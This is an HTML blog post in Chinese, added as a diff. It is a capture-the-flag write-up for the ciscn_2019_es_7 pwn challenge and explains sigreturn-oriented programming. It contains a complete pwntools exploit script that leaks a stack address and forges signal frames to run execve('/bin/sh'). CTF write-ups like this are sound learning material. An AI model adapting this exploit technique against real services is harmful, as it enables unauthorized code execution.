@@ -1,0 +1,49 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>BUU-ciscn_2019_es_7-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="这是一道国赛题，当然做之前我还不知道，到了我发现我不会做的时候才知道..这也是我做的第一道srop，虽然wp发的是三道里面最晚的，做完roo"><meta property="og:image" content><meta property="og:title" content="BUU-ciscn_2019_es_7-WP"><meta property="og:description" content="这是一道国赛题，当然做之前我还不知道，到了我发现我不会做的时候才知道..这也是我做的第一道srop，虽然wp发的是三道里面最晚的，做完roo"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/buu-ciscn_2019_es_7-wp.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-11-28T18:56:00+00:00"><meta property="article:modified_time" content="2020-11-28T18:56:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUU-ciscn_2019_es_7-WP"><meta name=twitter:description content="这是一道国赛题，当然做之前我还不知道，到了我发现我不会做的时候才知道..这也是我做的第一道srop，虽然wp发的是三道里面最晚的，做完roo"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>BUU-ciscn_2019_es_7-WP</h1><div class=meta>Posted on Nov 28, 2020</div></div><section class=body><p>这是一道国赛题，当然做之前我还不知道，到了我发现我不会做的时候才知道..这也是我做的第一道srop，虽然wp发的是三道里面最晚的，做完<strong><a href=https://www.cjovi.icu/WP/buu-rootersctf_2019_srop-wp.html>rootersctf_2019_srop</a></strong>这题我才能说我真正理解了。</p><p>本题知识点——SROP——被ctfwiki归类为高级rop，这道算是相对简单的srop。</p><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201118221232.png alt class=wp-image-532></figure></div><p>关闭了canary和pie。</p><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201118221418.png alt class=wp-image-533></figure></div><p>和一般的程序不同，此题的read和write是通过syscall（系统调用）来实现的而不是使用glibc包装的read和write，程序中难以寻找别的gadgets，而存在syscall，就可以考虑使用srop技术。</p><p>由于有read的系统调用（<code>xor rax, rax</code>把rax置零，零即代表sys_read），并且可以输入整整0x400个字节，我们可以完全伪造Signal Frame，同时程序中存在signal return的gadgets，这样我们就可以使用我们伪造的signal frame来控制寄存器，而传入<code>/bin/sh</code>我们可以通过直接输入并将其地址传入来实现。那么现在我们只需要做到泄露栈地址就可以了。这个实际上紧随sys_read的sys_write就直接泄露了，栈帧只有16+8+8的大小，而write输出0x30=48个字节，直接就把<strong>main压入的rbp</strong>泄露了出来。这样我们就获得了main的栈底的地址。</p><p>所以可以这样处理</p><pre class=wp-block-code><code>from pwn import *                                                                  
+                                                                                   
+context(log_level = 'debug',arch = 'amd64',os = 'linux')                           
+                                                                                   
+mov_rax_sigreturn = 0x4004DA                                                       
+read_addr = 0x4004F1                                                               
+syscall_ret = 0x400517                                                             
+                                                                                   
+sh = process("./ciscn_2019_es_7")                                                  
+#sh = remote("node3.buuoj.cn","26929")                                             
+                                                                                   
+payload = 'a'*0x10 + p64(read_addr)                                                
+sh.send(payload)                                                                   
+                                                                                   
+stack_addr = u64(sh.recv()[32:40])                                                 
+print hex(stack_addr)                                                              
+                                                                                   
+sigframe = SigreturnFrame()                                                        
+sigframe.rax = constants.SYS_read                                                  
+sigframe.rdx = 0x1000                                                              
+sigframe.rsi = stack_addr                                                          
+sigframe.rdi = 0                                                                   
+sigframe.rsp = stack_addr                                                          
+sigframe.rip = syscall_ret                                                         
+                                                                                   
+payload = 'a'*0x10 + p64(mov_rax_sigreturn) + p64(syscall_ret) + str(sigframe)     
+sh.send(payload)                                                                   
+sleep(0.3)                                                                         
+                                                                                   
+sigframe = SigreturnFrame()                                                        
+sigframe.rax = constants.SYS_execve                                                
+sigframe.rsi = 0                                                                   
+sigframe.rdx = 0                                                                   
+sigframe.rsp = stack_addr                                                          
+sigframe.rip = syscall_ret                                                         
+sigframe.rdi = stack_addr + 0x150                                                  
+                                                                                   
+payload = (p64(mov_rax_sigreturn) + p64(syscall_ret) + str(sigframe)).ljust(0x150,'a') 
+payload += "/bin/sh\x00"                                                           
+sh.send(payload)                                                                   
+                                                                                   
+sh.interactive()                                                                       </code></pre><p>至此我正式完成srop三剑客（ciscn_2019_es_7,<a href="https://www.cjovi.icu/?p=635">360chunqiu2017_smalles</a>t,<a href="https://www.cjovi.icu/?p=674">rootersctf_2019_srop</a>)的pwn和wp。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/srop>srop</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
